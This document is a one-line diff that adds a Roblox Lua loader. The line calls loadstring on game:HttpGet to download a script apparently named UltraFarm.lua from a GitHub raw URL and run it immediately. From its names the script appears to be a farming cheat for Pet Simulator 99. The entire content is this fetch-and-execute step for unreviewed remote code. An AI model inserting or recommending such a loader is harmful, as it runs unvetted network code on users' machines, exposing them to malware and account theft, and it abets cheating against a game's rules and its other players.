@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/0vma/PS99/main/UltraFarm.lua", true))()
